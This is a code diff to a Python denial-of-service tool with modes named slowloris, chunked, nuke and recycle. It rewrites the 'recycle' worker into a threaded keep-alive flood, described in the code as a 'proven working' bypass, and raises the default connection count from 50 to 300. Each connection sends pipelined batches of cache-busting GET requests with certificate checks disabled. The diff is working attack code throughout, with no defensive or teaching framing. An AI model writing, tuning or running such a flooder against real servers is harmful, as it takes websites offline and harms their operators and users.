@@ -176,43 +176,70 @@ def _make_sock(target, port, use_ssl):
 
 
 def worker_recycle(target, port, use_ssl, conns, pipeline, duration):
-    import select
+    """
+    Exploit keep-alive: open N connections -> send hundreds of requests each.
+    Proven working version (from nexo_bypass.py). Uses threads, not multiprocessing.
+    """
+    import concurrent.futures
     end = time.time() + duration
-    socks = []
-    for _ in range(conns):
-        try: socks.append(_make_sock(target, port, use_ssl))
-        except Exception: pass
-    sent = err = by = 0
-    while time.time() < end and not STOP.is_set():
-        alive = []
-        for s in socks:
-            try:
+    total_sent = 0
+    total_bytes = 0
+
+    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0"
+    PATHS = ["/", "/index.html", "/api/v1/status", "/login", "/search?q=" + str(random.randint(1,999)),
+             "/admin", "/dashboard", "/api/metrics", "/healthz", "/products/1", "/user/profile"]
+
+    CONN_COUNT = conns  # passed from attack_mode (default 300)
+
+    def recycle_conn():
+        nonlocal total_sent, total_bytes
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(10)
+            s.connect((target, port))
+            if use_ssl:
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                s = ctx.wrap_socket(s, server_hostname=target)
+
+            while time.time() < end and not STOP.is_set():
                 batch = b""
-                for _ in range(pipeline):
-                    p = random.choice(PATHS) + str(random.randint(1,999999))
-                    batch += (f"GET {p} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {random.choice(UA_POOL)}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n").encode()
-                s.sendall(batch); sent += pipeline; by += len(batch)
-                r,_,_ = select.select([s],[],[],0)
-                if r:
-                    try: s.recv(65536)
-                    except Exception: pass
-                alive.append(s)
-            except Exception:
-                err += 1
-                try: s.close()
-                except Exception: pass
-        # Replenish dead connections
-        while len(alive) < conns:
-            try:
-                alive.append(_make_sock(target, port, use_ssl))
-            except Exception:
-                break
-            time.sleep(0.05)
-        socks = alive
-    for s in socks:
-        try: s.close()
-        except Exception: pass
-    _add(sent=sent, err=err, by=by, opn=len(socks), peak=len(socks))
+                pl = pipeline
+                for _ in range(pl):
+                    path = random.choice(PATHS) + "&_=" + str(random.randint(1, 99999))
+                    batch += (
+                        f"GET {path} HTTP/1.1\r\n"
+                        f"Host: {target}\r\n"
+                        f"User-Agent: {UA}\r\n"
+                        f"Connection: keep-alive\r\n"
+                        f"\r\n"
+                    ).encode()
+                s.sendall(batch)
+                total_sent += pl
+                total_bytes += len(batch)
+
+                # Drain response
+                s.settimeout(1)
+                try:
+                    while True:
+                        data = s.recv(16384)
+                        if not data:
+                            break
+                except (socket.timeout, Exception):
+                    pass
+                s.settimeout(10)
+
+            s.close()
+        except Exception:
+            pass
+        return 0
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=CONN_COUNT) as ex:
+        futures = [ex.submit(recycle_conn) for _ in range(CONN_COUNT)]
+        while not all(f.done() for f in futures) and not STOP.is_set():
+            time.sleep(2)
+    _add(sent=total_sent, by=total_bytes, opn=CONN_COUNT, peak=CONN_COUNT)
 
 
 def worker_slow(target, port, use_ssl, conns, pipeline, duration):
@@ -354,7 +381,7 @@ def worker_nuke(target, port, use_ssl, conns, pipeline, duration):
         except Exception: pass
 
 
-def attack_mode(target, port, use_ssl, mode, duration, conns=50, pipeline=500):
+def attack_mode(target, port, use_ssl, mode, duration, conns=300, pipeline=500):
     # Reset stats BEFORE spawning workers (fork copies current state)
     for i in range(6): STAT[i] = 0
     STOP.clear()
@@ -435,7 +462,7 @@ def main():
     ap.add_argument("--mode", default="", choices=["recon","analyze","slow","slowloris","recycle","chunked","nuke"])
     ap.add_argument("--port", type=int, default=443)
     ap.add_argument("--no-ssl", action="store_true")
-    ap.add_argument("--conns", type=int, default=50)
+    ap.add_argument("--conns", type=int, default=300)
     ap.add_argument("--pipeline", type=int, default=100)
     ap.add_argument("--duration", type=int, default=60)
     ap.add_argument("--yes", action="store_true")
